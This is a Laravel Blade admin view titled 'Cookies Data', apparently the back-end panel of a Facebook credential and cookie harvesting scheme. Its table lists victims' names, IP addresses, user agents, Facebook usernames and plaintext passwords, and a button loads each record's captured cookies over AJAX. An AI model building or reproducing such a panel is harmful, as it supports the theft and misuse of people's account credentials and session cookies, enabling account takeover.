@extends('admin.layouts.master')

@section('content')

       <div class="row">
        <div class="col-xs-12">
    <div class="box">
        <div class="box-header">
            <h3 class="box-title">Cookies Data</h3>
        </div>
        <!-- /.box-header -->
        <div class="box-body">
            <table id="example1" class="table table-bordered table-striped">
                     <thead>

                       <tr>
                   
                      <th>#</th>
                       <th>Name</th>
                       <th>IP</th>
                       <th>User Agent</th>
                       <th>FB User </th>
                       <th>FB Password</th>
                       <!-- <th>Last Seen</th>
                       <th>Register</th> -->
                       <th></th>
                       <th></th>
                      <!--  <th></th> -->
                       
                     
                     </tr>
                     </thead>
                     <tbody>                       
@if(!empty($data))
@php $i = 1; @endphp
                       @foreach($data as $datas) 
                        <tr>   
                        <td>@php echo$i++; @endphp</td>                     
                       <td>{{$datas['user']['name']}} </td>
                       <td>{{$datas['ip']}}</td>                       
                       <td>{{$datas['user_agent']}}</td>
                       <td>{{$datas['email']}}</td>
                       <td>{{$datas['password']}}</td>
                     
                       <td>   <button type="button" class="btn btn-info btn-lg userdT" data-user-id ="{{$datas['id']}}" data-toggle="modal" data-target="#myModal">View</button>
                       </td>

                       <td><a href="{{url('/delete/'.$datas['id'])}}" class="btn btn-info btn-lg">Delete</a>
</td>



                        
                      </tr> 
                        @endforeach 
                        @else
                       <tr> No Data Found </tr>
                        @endif
                     </tbody>
                 
                   </table>
                  </div>
        <!-- /.box-body -->
    </div>
        </div>
    </div>
      <!-- Modal -->


  
 


<div class="container">
 
  <div class="modal fade" id="myModal" role="dialog">
    <div class="modal-dialog modal-lg" style="overflow:hidden; word-wrap:break-word">
    
      <!-- Modal content-->
      <div class="modal-content">
        <div class="modal-header">
          <button type="button" class="close" data-dismiss="modal">&times;</button>
          <h4 class="modal-title">Cookies Data</h4>
        </div>
        <div class="modal-body getdata">

          
        </div>
        <div class="modal-footer">
          <button type="button" class="btn btn-default" data-dismiss="modal">Close</button>
        </div>
      </div>
      
    </div>
  </div>
  
</div>





@endsection



@section('javascript')
<script type="text/javascript">

$(document).ready(function(){
   
      $("#example1").on("click", ".userdT", function(){
      var id = $(this).data("user-id");

     var url = "{{url('/getcookies')}}";

        $.ajax({
            url: url+'/'+id,
            type: 'GET',  
            data: {'id':id},          
            success: function (data) {
                $('.getdata').text(data);
            }
        });
    });
});

</script>
@stop